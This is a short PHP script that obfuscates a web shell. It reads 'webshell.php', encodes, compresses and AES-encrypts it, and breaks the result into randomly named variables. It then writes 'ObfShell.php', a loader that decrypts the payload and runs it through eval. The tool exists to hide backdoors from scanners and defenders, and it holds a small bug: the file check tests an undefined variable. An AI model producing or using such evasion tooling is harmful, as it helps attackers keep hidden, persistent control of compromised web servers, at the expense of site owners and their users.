<?php
function obfuscate($i, $o) {

    if (!file_exists($input)) {
        die("Error: input file doesnt exist\n");
    }


    $file_content = file_get_contents($i);


    $encoded_content = base64_encode($file_content);
    $encoded_content = urlencode($encoded_content);
    $compresse_content = gzcompress($encoded_content);


    $encryptionKey = bin2hex(openssl_random_pseudo_bytes(32)); 
    $iv = bin2hex(openssl_random_pseudo_bytes(16)); 
    $encrypt_content = openssl_encrypt($compresse_content, 'aes-256-cbc', hex2bin($encryptionKey), 0, hex2bin($iv));


    $chunks = str_split($encrypt_content, 50);
    $chunkVars = [];


    $obfuscatedCode = "<?php\n";
    foreach ($chunks as $index => $chunk) {
        $chunkVar = 'v_' . bin2hex(random_bytes(6));
        $chunkVars[] = $chunkVar;
        $obfuscatedCode .= "$${chunkVar} = '$chunk';\n";
    }


    $reassembled = 'v_' . bin2hex(random_bytes(6));
    $obfuscatedCode .= "$${reassembled} = '';\n";
    foreach ($chunkVars as $chunkVar) {
        $obfuscatedCode .= "$${reassembled} .= $${chunkVar};\n";
    }

    

    $randomFuncDecode = 'f_' . bin2hex(random_bytes(6));
    $randomVarEncrypted = 'v_' . bin2hex(random_bytes(6));
    $randomVarKey = 'v_' . bin2hex(random_bytes(6));
    $randomVarIv = 'v_' . bin2hex(random_bytes(6));
    $randomVarDecrypted = 'v_' . bin2hex(random_bytes(6));
    $randomVarDecompressed = 'v_' . bin2hex(random_bytes(6));
    $randomVarDecoded = 'v_' . bin2hex(random_bytes(6));



    $obfuscatedCode .= "function $randomFuncDecode(\$${randomVarEncrypted}, \$${randomVarKey}, \$${randomVarIv}) {\n";
    $obfuscatedCode .= "    \$${randomVarDecrypted} = openssl_decrypt(\$${randomVarEncrypted}, 'aes-256-cbc', hex2bin(\$${randomVarKey}), 0, hex2bin(\$${randomVarIv}));\n";
    $obfuscatedCode .= "    if (\$${randomVarDecrypted} === false) die('dec failed.');\n";
    $obfuscatedCode .= "    \$${randomVarDecompressed} = gzuncompress(\$${randomVarDecrypted});\n";
    $obfuscatedCode .= "    \$${randomVarDecoded} = urldecode(\$${randomVarDecompressed});\n";
    $obfuscatedCode .= "    return base64_decode(\$${randomVarDecoded});\n";
    $obfuscatedCode .= "}\n";


    $randomVarDecodedContent = 'v_' . bin2hex(random_bytes(6));
    $obfuscatedCode .= "$${randomVarDecodedContent} = $randomFuncDecode($${reassembled}, '$encryptionKey', '$iv');\n";
    $obfuscatedCode .= "eval('?>' . $${randomVarDecodedContent});\n";


    file_put_contents($o, $obfuscatedCode);
    echo "Obfuscate end,save to==> $o\n";
}


$i = 'webshell.php'; 
$o = 'ObfShell.php'; 

obfuscate($i, $o);
?>

